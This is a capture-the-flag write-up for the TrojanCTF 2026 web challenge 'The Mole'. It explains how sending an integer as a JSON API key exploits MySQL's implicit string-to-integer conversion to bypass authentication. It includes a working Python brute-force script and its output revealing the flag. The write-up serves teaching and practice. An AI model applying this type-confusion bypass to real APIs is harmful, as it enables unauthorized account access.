# TrojanCTF 2026 - Web - The Mole
Writeup by Anis Errais

### The challenge
The goal is to make a request to an endpoint with an API key belonging the `admin` user.
The source code provides us with a database structure and Node JS app containing two endpoints:
- `/generate_api_key`: Unauthenticated request to generate an API key for a given user. However, only works when the user does not have an API key yet. Unforunately: the admin user already does have an API key hardcoded in the MySQL database.
- `/login`: Uses an API key to either get the name of a random movie, or if the user is admin: the flag.

The request body for the `/login` endpoint is JSON:
```json
{
  "api_key": "iamaverylongapikey"
}
```
It uses the following code to retrieve the username:
```js
db.query(
    "SELECT user FROM api_keys WHERE api_key = ? LIMIT 1",
    [api_key],
    ...
)
```

### The solution
Our initial thought when we saw this challenge was SQL injection. However, the Node `mysql` library is used with parameterized queries. So this is unlikely.

But, the JSON format for `/login` is interesting. It is parsed by Node into actual JavaScript objects, **without type checking**. This means that the caller of the API controls the types passed to the endpoint.

Another important realization is knowing how SQL compares objects of different types. Let's say we pass an integer to endpoint. The API key in the database is stored as a string. So we are comparing a string to an integer.

The `=` operator is sometimes undefined when used with mixed types. However, most implementations coerce the string to an integer. Let's say we have the following API key stored in the database:
```71fea0493ab3e9bcfe1b0d505f4108edb5807bb51a1898b2a4f30db3d02ba48e```

When checking whether the submitted API key equals this value, MySQL will instead check whether the submitted key equals to `71`.
This simplifies things a lot, since most API keys only have a few numbers before the first letter, so we can expect to find it within a few hundred calls. We can simply bruteforce this using a Python script:
```python
import requests

URL = "https://mole.chall.trojanc.tf/login"
for i in range(1, 101):
    payload = { "api_key": i }

    try:
        response = requests.post(URL, json=payload)
        print(f"Request {i}: {response.status_code} -> {response.text}")
    except Exception as e:
        print(f"Request {i}: ERROR -> {e}")
```
Running the script gives us the flag after a few dozen requests:
```
❯ python ./test.py
Request 1: 403 -> {"message":"Unauthenticated"}
Request 2: 403 -> {"message":"Unauthenticated"}
Request 3: 403 -> {"message":"Unauthenticated"}
...
Request 50: 403 -> {"message":"Unauthenticated"}
Request 51: 403 -> {"message":"Unauthenticated"}
Request 52: 403 -> {"message":"Unauthenticated"}
Request 53: 200 -> {"message":"Hi Admin, here's the leaked movie: Trojan{my5ql_1mpl1c17_7yp3_c0nv3r510n_32126624}"}
```
Note that the server was rate limited, so this took about a minute to run.